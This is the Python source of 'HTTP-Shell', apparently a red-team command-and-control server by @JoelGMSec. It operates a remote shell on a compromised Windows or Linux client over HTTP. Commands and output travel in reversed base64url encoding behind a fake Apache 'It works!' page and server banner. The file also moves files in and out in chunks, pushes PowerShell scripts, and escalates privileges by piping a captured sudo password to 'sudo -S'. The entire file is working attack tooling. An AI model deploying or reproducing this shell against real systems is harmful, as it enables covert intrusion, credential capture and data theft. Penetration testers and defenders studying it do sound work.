#!/usr/bin/python3
#============================#
#  HTTP-Shell by @JoelGMSec  #
#    https://darkbyte.net    #
#============================#

import os
import oslex
import base64
import pwinput
import readline
import neotermcolor
from sys import argv
from neotermcolor import colored
from http.server import BaseHTTPRequestHandler, HTTPServer

system = None
supersu = False
remote_files = []
last_prompt = None
cmd_response = True
sudo = False ; root = False
autocomplete_pending = False
command = None ; prompt = None
local_path = None ; remote_path = None
first_run = True ; wait_for_cmd = False
neotermcolor.readline_always_safe = True
chunk_size = 65536
upload_chunk_buffer = {}
import_encoded = None ; import_filename = None

banner = r"""
  _   _ _____ _____ ____      ____  _          _ _ 
 | | | |_   _|_   _|  _ \    / ___|| |__   ___| | |
 | |_| | | |   | | | |_) |___\___ \| "_ \ / _ \ | |
 |  _  | | |   | | |  __/_____|__) | | | |  __/ | |
 |_| |_| |_|   |_| |_|       |____/|_| |_|\___|_|_|"""                                    

banner2 = """                                               
  ---------------- by @JoelGMSec -----------------
"""

def update_remote_files_list():
    global remote_files, autocomplete_pending, system, prompt
    autocomplete_pending = True
    if system == "windows":
        if prompt and "!" in prompt:
            current_path = prompt.split("!")[-1].strip()
            command = f"(ls {current_path}).Name"
        else:
            command = "(ls).Name"
    else:
        if prompt and "!" in prompt:
            current_path = prompt.split("!")[-1].strip()
            command = f"ls {current_path}"
        else:
            command = "ls"
    return command

def completer(text, state):
    global remote_files
    text_lower = text.lower()
    options = [f for f in remote_files if f.lower().startswith(text_lower)]
    if state < len(options):
        return options[state]
    return None

readline.set_completer(completer)
readline.parse_and_bind("tab: complete")
disable_pw = ("-npw" in argv)

class MyServer(BaseHTTPRequestHandler):
    _file_cache = {}

    def _set_headers(self, code=200):
        self.send_response(code)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

    def get_encoded_file(self, file_path):
        try:
            stat_info = os.stat(file_path)
            key = (file_path, stat_info.st_mtime_ns, stat_info.st_size)
            if key in MyServer._file_cache:
                return MyServer._file_cache[key]
            with open(file_path, "rb") as filename:
                encoded = self.encode_file_revbase64url(filename.read())
            if encoded is None:
                encoded = ""
            MyServer._file_cache.clear()
            MyServer._file_cache[key] = encoded
            return encoded
        except OSError:
            return None

    def encode_file_revbase64url(self, file_content):
        try:
            encoded = base64.b64encode(file_content).decode("utf-8")
            encoded = encoded.replace("+", "-").replace("/", "_").rstrip("=")
            return encoded[::-1]
        except:
            pass

    def encode_reversed_base64url(self, plain_data):
        try:
            encoded = base64.b64encode(plain_data.encode("utf-8")).decode("utf-8")
            encoded = encoded.replace("+", "-").replace("/", "_").rstrip("=")
            return encoded[::-1]
        except:
            pass

    def decode_file_revbase64url(self, file_content):
        try:
            encoded_data = file_content[::-1]
            base64_data = encoded_data.replace("-", "+").replace("_", "/")
            while len(base64_data) % 4 != 0:
                base64_data += "="
            decoded_data = base64.b64decode(base64_data)
            return decoded_data
        except:
            pass

    def decode_reversed_base64url(self, encoded_data):
        try:
            encoded_data = encoded_data[::-1]
            base64_data = encoded_data.replace("-", "+").replace("_", "/")
            while len(base64_data) % 4 != 0:
                base64_data += "="
            decoded_data = base64.b64decode(base64_data).decode("utf-8")
            return decoded_data
        except:
            pass
    
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        global cmd_response
        global wait_for_cmd ; global root
        global prompt ; global first_run ; global sudo
        global local_path ; global remote_path ; global command 
        global system, last_prompt, autocomplete_pending
        global import_encoded ; global import_filename
        self.server_version = "Apache/2.4.18"
        self.sys_version = "(Ubuntu)"
        try:
            if self.path == "/api/v1/Client/Download":
                try:
                    with open(local_path, "rb") as filename:
                        file_content = filename.read()
                        encoded_file = "File: "
                        encoded_file += self.encode_file_revbase64url(file_content)
                        self._set_headers()
                        self.wfile.write(encoded_file.encode("utf-8"))
                        print(colored(f"[+] Uploaded {remote_path} successfully!", "green"))
                except:
                    print(colored(f"[!] Error reading \"{local_path}\" file!", "red"))

            elif self.path.startswith("/api/v1/Client/DownloadChunk"):
                try:
                    chunk_index = 0
                    if "?" in self.path and "index=" in self.path:
                        query_string = self.path.split("?", 1)[1]
                        for query_part in query_string.split("&"):
                            if query_part.startswith("index="):
                                chunk_index = int(query_part.split("=", 1)[1])
                                break

                    encoded_full = self.get_encoded_file(local_path)
                    if encoded_full is None:
                        print(colored(f"[!] Error reading \"{local_path}\" file!", "red"))
                        self._set_headers()
                        self.wfile.write(b"FileChunkDone")
                        return

                    start = chunk_index * chunk_size
                    end = start + chunk_size
                    if start >= len(encoded_full):
                        encoded_chunk = "FileChunkDone"
                        print(colored(f"[+] Uploaded {remote_path} successfully!", "green"))
                    else:
                        chunk_data = encoded_full[start:end]
                        is_last = "1" if end >= len(encoded_full) else "0"
                        encoded_chunk = f"FileChunk:{chunk_index}:{is_last}:{chunk_data}"
                        if is_last == "1":
                            print(colored(f"[+] Uploaded {remote_path} successfully!", "green"))

                    self._set_headers()
                    self.wfile.write(encoded_chunk.encode("utf-8"))
                except:
                    print(colored(f"[!] Error reading \"{local_path}\" file!", "red"))

            elif self.path.startswith("/api/v1/Client/Update"):
                try:
                    chunk_index = 0
                    if "?" in self.path and "index=" in self.path:
                        query_string = self.path.split("?", 1)[1]
                        for query_part in query_string.split("&"):
                            if query_part.startswith("index="):
                                chunk_index = int(query_part.split("=", 1)[1])
                                break

                    if import_encoded is None:
                        self._set_headers()
                        self.wfile.write(b"FileChunkDone")
                        return

                    start = chunk_index * chunk_size
                    end = start + chunk_size
                    if start >= len(import_encoded):
                        encoded_chunk = "FileChunkDone"
                        print(colored(f"[+] File \"{import_filename}\" imported successfully!", "green"))
                        import_encoded = None ; import_filename = None
                    else:
                        chunk_data = import_encoded[start:end]
                        is_last = "1" if end >= len(import_encoded) else "0"
                        encoded_chunk = f"FileChunk:{chunk_index}:{is_last}:{chunk_data}"
                        if is_last == "1":
                            print(colored(f"[+] File \"{import_filename}\" imported successfully!", "green"))
                            import_encoded = None ; import_filename = None

                    self._set_headers()
                    self.wfile.write(encoded_chunk.encode("utf-8"))
                except:
                    print(colored("[!] Error importing file!", "red"))

            elif self.path == "/api/v1/Client/Token":
                if prompt and "\\" in prompt:
                    system = "windows"
                else:
                    system = "linux"
    
                if first_run:
                    autocomplete_pending = True
                    if system == "windows":
                        command = "(ls).Name"
                    else:
                        command = "ls"
                    
                    encoded_command = "Token: "
                    encoded_command += self.encode_reversed_base64url(command)
                    self._set_headers()
                    self.wfile.write(encoded_command.encode("utf-8"))
                    first_run = False
                    return first_run, command, wait_for_cmd, sudo, root, cmd_response
                
                if prompt != last_prompt and not autocomplete_pending and not first_run:
                    last_prompt = prompt
                    autocomplete_pending = True
                    if system == "windows":
                        if prompt and "!" in prompt:
                            current_path = prompt.split("!")[-1].strip()
                            command = f"(ls {current_path}).Name"
                        else:
                            command = "(ls).Name"
                    else:
                        if prompt and "!" in prompt:
                            current_path = prompt.split("!")[-1].strip()
                            command = f"ls {current_path}"
                        else:
                            command = "ls"
                    
                    encoded_command = "Token: "
                    encoded_command += self.encode_reversed_base64url(command)
                    self._set_headers()
                    self.wfile.write(encoded_command.encode("utf-8"))
                    return first_run, command, wait_for_cmd, sudo, root, cmd_response

                if root:
                    whoami = "root"
                else:
                    whoami = prompt.split("!")[0].split("@")[0]
                hostname = prompt.split("!")[0].split("@")[1]
                path = prompt.split("!")[-1]
                cinput = (colored(" [HTTP-Shell] ", "grey", "on_green")) ; cinput += (colored(" ", "green", "on_blue"))
                cinput += (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip() + " ", "grey", "on_blue"))
                old_user = whoami

                if "\\" in path:
                    slash = "\\"
                else:
                    slash = "/"

                if len(str(path).rstrip()) > 24:
                    shortpath = str(path).rstrip().split(slash)[-3:] ; shortpath = ".." + slash + slash.join(map(str, shortpath))
                    cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(shortpath.rstrip() + " ", "grey", "on_yellow"))
                else:
                    cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(path.rstrip() + " ", "grey", "on_yellow"))
                cinput += (colored(" ", "yellow"))

                if cmd_response:
                    command = input(cinput + "\001\033[0m\002")
                    split_cmd = command.split()

                    if command == "" or command == None or not command:
                        print()
                    
                    if command == "exit":
                        if root:
                            whoami = old_user
                            root = False ; command = None
                            print()
                        else:
                            print (colored("[!] Exiting..\n", "red"))
                            exit(0)

                    if command == "kill":
                        command = "exit"

                    if command == "clear" or command == "cls":
                        os.system("clear")
                        command = None

                    if "supersu" in command.split()[0]:
                        if system != "linux":
                            print(colored("[!] Error: supersu is only available on Linux hosts\n", "red"))
                        else:
                            global supersu
                            supersu = True
                            command = None
                            root = True
                            print()

                    if "sudo" in command.split()[0]:
                        if system != "linux":
                            print(colored("[!] Error: sudo is only available on Linux hosts\n", "red"))
                        else:
                            args = oslex.split(command)
                            if len(args) < 2:
                                print(colored("[!] Usage: sudo \"command\" or sudo su\n","red"))
                                command = None
                            else:
                                if not sudo:
                                    old_cmd = ' '.join(args[1:])
                                    print (colored(f"[sudo] password for {str(whoami).rstrip()}:\n","red"))
                                    if disable_pw:
                                        sudo_pass = input(cinput + "\001\033[0m\002")
                                    else:
                                        sudo_pass = pwinput.pwinput(prompt=(cinput + "\001\033[0m\002"))
                                    command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S " + old_cmd)
                                    wait_for_cmd = True ; sudo = True
                                    if "su" in args:
                                        command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S printf 'HTTPShellNull'")
                                        root = True
                                else:
                                    old_cmd = ' '.join(args[1:])
                                    command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
                                    if "su" in args:
                                        command = str("printf 'HTTPShellNull'" + " | " + "sudo -S printf 'HTTPShellNull'")
                                        root = True

                    if "upload" in command.split()[0]:
                        args = oslex.split(command)
                        if len(args) < 3 or len(args) > 3:
                            print(colored("[!] Usage: upload \"local_file\" \"remote_file\"\n","red"))
                            command = None
                        else:
                            local_path = args[1]
                            remote_path = args[2]
                            command = "upload " + args[1] + "!" + args[2]
                            
                    if "download" in command.split()[0]:
                        args = oslex.split(command)
                        if len(args) < 3 or len(args) > 3:
                            print(colored("[!] Usage: download \"local_file\" \"remote_file\"\n","red"))
                            command = None
                        else:
                            remote_path = args[1]
                            local_path = args[2]
                            command = "download " + args[1] + "!" + args[2]
                            
                    if "import-ps1" in command.split()[0]:
                        args = oslex.split(command)
                        if len(args) < 2 or len(args) > 2:
                            print(colored("[!] Usage: import-ps1 \"/path/script.ps1\"\n", "red"))
                            command = None
                        else:  
                            try:
                                filename = args[1]
                                with open(filename, "rb") as f:
                                    import_encoded = self.encode_file_revbase64url(f.read())
                                import_filename = filename
                                command = "import-ps1 " + filename

                            except FileNotFoundError:
                                print(colored(f"[!] File \"{filename}\" not found!\n", "red"))
                                command = None

                    if "help" in command.split()[0]:
                        print(colored("[+] Available commands:","green"))
                        print(colored("    upload: Upload a file from local to remote computer","blue"))
                        print(colored("    download: Download a file from remote to local computer","blue"))
                        print(colored("    import-ps1: Import PowerShell script on Windows hosts","blue"))
                        print(colored("    supersu: Force all commands to be executed as root","blue"))
                        print(colored("    clear/cls: Clear terminal screen","blue"))
                        print(colored("    kill: Kill client connection","blue"))
                        print(colored("    exit: Exit from program\n","blue"))
                        command = None

                    if command is not None:
                        cmd_response = False
                        first_run = False

                        if root and not "cd" in command:
                            if not wait_for_cmd and not "exit" in command:
                                if supersu:
                                    old_cmd = command
                                    command = str("printf 'HTTPShellNull'" + " | " + "su -c " + '"' + old_cmd + '"')
                                if not supersu:
                                    old_cmd = command
                                    command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + '"' + old_cmd + '"')

                encoded_command = "Token: "
                encoded_command += self.encode_reversed_base64url(command)
                self._set_headers()
                self.wfile.write(encoded_command.encode("utf-8"))

                if command == "exit":
                    print (colored("[!] Exiting..\n", "red"))
                    exit(0)

            elif self.path.lower() == "/robots.txt":
                try:
                    with open("robots.txt", "rb") as f:
                        content = f.read()
                    self.send_response(200)
                    self.send_header("Content-Type", "text/plain")
                    self.send_header("Content-Length", len(content))
                    self.end_headers()
                    self.wfile.write(content)
                except:
                    self.send_response(404)
                    self.send_header("Content-Type", "text/plain")
                    self.end_headers()
                    self.wfile.write(b"robots.txt not found")

            else:
                itworks_message = "<html><body><h1>It works!</h1><p>This is the default web page for this server.<p></body></html>"
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", len(itworks_message))
                self.end_headers()
                self.wfile.write(itworks_message.encode())

        except(AttributeError, UnboundLocalError, BrokenPipeError, ConnectionResetError, IndexError, TypeError):
            pass

        return first_run, command, wait_for_cmd, sudo, root, cmd_response

    def do_POST(self):
        global cmd_response
        global wait_for_cmd ; global root
        global prompt ; global first_run ; global sudo
        global local_path ; global remote_path ; global command 
        global remote_files, autocomplete_pending, last_prompt
        self.server_version = "Apache/2.4.18"
        self.sys_version = "(Ubuntu)"
        try:
            self._set_headers() ; response = "Success"
            content_length = int(self.headers["Content-Length"])
            encoded_data = self.rfile.read(content_length).decode("utf-8")
            encoded_payload = encoded_data.split()[-1]

            if str("Info:") in encoded_data:
                prompt = self.decode_reversed_base64url(encoded_payload)
                if last_prompt is None:
                    last_prompt = prompt

            else:
                if self.path in ("/api/v1/Client/Debug", "/api/v1/Client/Error"):
                    decoded_payload = self.decode_reversed_base64url(encoded_payload)
                else:
                    decoded_payload = None

            if self.path == "/api/v1/Client/Info":
                self.wfile.write(response.encode())

            elif self.path == "/api/v1/Client/Upload":
                if decoded_payload is not None:
                    try:
                        with open(local_path, "wb") as filename:
                            file_content = self.decode_file_revbase64url(encoded_payload)
                            filename.write(file_content)
                            self.wfile.write(response.encode())
                            print(colored(f"[+] Downloaded {local_path} successfully!", "green"))
                    except:
                        print(colored(f"[!] Error writing \"{remote_path}\" file!", "red"))
                else:
                    print(colored(f"[!] Error downloading \"{remote_path}\" file!", "red"))

            elif self.path == "/api/v1/Client/UploadChunk":
                try:
                    global upload_chunk_buffer
                    _, chunk_index, is_last, chunk_payload = encoded_data.split(":", 3)
                    chunk_index = int(chunk_index.strip())
                    is_last = is_last.strip() == "1"
                    chunk_payload = chunk_payload.strip()

                    if chunk_index == 0:
                        upload_chunk_buffer[local_path] = {}
                    if local_path not in upload_chunk_buffer:
                        upload_chunk_buffer[local_path] = {}

                    upload_chunk_buffer[local_path][chunk_index] = chunk_payload

                    if is_last:
                        all_chunks = upload_chunk_buffer.get(local_path, {})
                        ordered_indexes = sorted(all_chunks.keys())
                        expected_indexes = list(range(len(ordered_indexes)))
                        if ordered_indexes != expected_indexes:
                            print(colored(f"[!] Missing chunk sequence for \"{remote_path}\" file!", "red"))
                        else:
                            encoded_full = "".join(all_chunks[index] for index in ordered_indexes)
                            file_content = self.decode_file_revbase64url(encoded_full)
                            if file_content is None:
                                print(colored(f"[!] Error decoding \"{remote_path}\" assembled chunks!", "red"))
                            else:
                                with open(local_path, "wb") as filename:
                                    filename.write(file_content)
                                print(colored(f"[+] Downloaded {local_path} successfully!", "green"))
                        upload_chunk_buffer.pop(local_path, None)

                    self.wfile.write(response.encode())
                except:
                    print(colored(f"[!] Error downloading \"{remote_path}\" file!", "red"))

            elif self.path == "/api/v1/Client/Debug":
                if autocomplete_pending:
                    if decoded_payload:
                        remote_files = decoded_payload.strip().split("\n")
                        remote_files = [f.strip() for f in remote_files if f.strip()]
                    autocomplete_pending = False
                    cmd_response = True
                elif not first_run and command is not None:
                    cmd_response = True
                    if decoded_payload == "" or not decoded_payload:
                        print()
                    else:
                        lines = decoded_payload.split("\n")
                        while lines and lines[0].strip() == "":
                            lines.pop(0)
                        while lines and lines[-1].strip() == "":
                            lines.pop(-1)
                        if lines:
                            lines[0] = lines[0].lstrip()
                        decoded_payload = "\n".join(lines)
                    if wait_for_cmd:
                        wait_for_cmd = False ; sudo = True
                    if "[sudo]" in decoded_payload:
                        lines = decoded_payload.split("\n")
                        filtered_lines = [line for line in lines if "[sudo]" not in line]
                        decoded_payload = "\n".join(filtered_lines)
                        print(colored(decoded_payload.rstrip()+"\n", "white"))
                    else:
                        if "HTTPShellNull" in decoded_payload:
                            print()
                        else:
                            print(colored(decoded_payload.rstrip()+"\n", "white"))
                self.wfile.write(response.encode())

            elif self.path == "/api/v1/Client/Error":
                if autocomplete_pending:
                    remote_files = []
                    autocomplete_pending = False
                    cmd_response = True
                elif not first_run and command is not None:
                    cmd_response = True
                    if decoded_payload == "" or not decoded_payload:
                        print()
                    else:
                        lines = decoded_payload.split("\n")
                        while lines and lines[0].strip() == "":
                            lines.pop(0)
                        while lines and lines[-1].strip() == "":
                            lines.pop(-1)
                        if lines:
                            lines[0] = lines[0].lstrip()
                        decoded_payload = "\n".join(lines)
                    if wait_for_cmd:
                        wait_for_cmd = False ; sudo = False
                    if "[sudo]" in decoded_payload:
                        if not root:
                            lines = decoded_payload.split("\n")
                            filtered_lines = [line for line in lines if "[sudo]" not in line]
                            decoded_payload = "\n".join(filtered_lines)
                            print(colored(decoded_payload.rstrip()+"\n", "red"))
                        else:
                            print(colored("Sorry, try again.\nsudo: 1 incorrect password attempt\n", "red"))
                            root = False
                    elif "HTTP-Client.sh" in decoded_payload:
                        decoded_payload = decoded_payload.split(":")[-1]
                        replace_payload = "bash: " + command + ":" + decoded_payload
                        print(colored(replace_payload.rstrip()+"\n", "red"))
                    elif "EmptyStringNotAllowed" in decoded_payload:
                        pass
                    elif "Invoke-WebRequest" in decoded_payload:
                        pass
                    elif "No such file or directory" in decoded_payload:
                        print(colored(decoded_payload.rstrip()+"\n", "red"))
                    else:
                        if "HTTPShellNull" in decoded_payload:
                            print()
                        else:
                            print(colored(decoded_payload.rstrip()+"\n", "red"))
                self.wfile.write(response.encode())

            else:
                itworks_message = "<html><body><h1>It works!</h1><p>This is the default web page for this server.<p></body></html>"
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", len(itworks_message))
                self.end_headers()
                self.wfile.write(itworks_message.encode())

        except:
            pass

        return prompt, cmd_response

    def log_message(self, format, *args):
            pass

def run(server_class=HTTPServer, handler_class=MyServer, port=80):
    server_address = ("", port)
    httpd = server_class(server_address, handler_class)
    if not "-silent" in argv:
        print(colored(f"[>] Waiting for connection on port {port}..\n", "yellow"))
    httpd.serve_forever()

if __name__ == "__main__":
    while True:
        try:
            if not "-silent" in argv:
                print (colored(banner, "blue"))
                print (colored(banner2, "green"))

            if len(argv) > 1:
                if "-h" in argv[1]:
                    print(colored("[!] Usage: HTTP-Server.py [PORT]\n","red"))
                    exit(0)
                else:
                    run(port=int(argv[1]))
            else:
                print(colored("[!] Usage: HTTP-Server.py [PORT]\n","red"))
                exit(0)

        except KeyboardInterrupt:
            print (colored("\n[!] Exiting..", "red"))
            exit(0)
            break
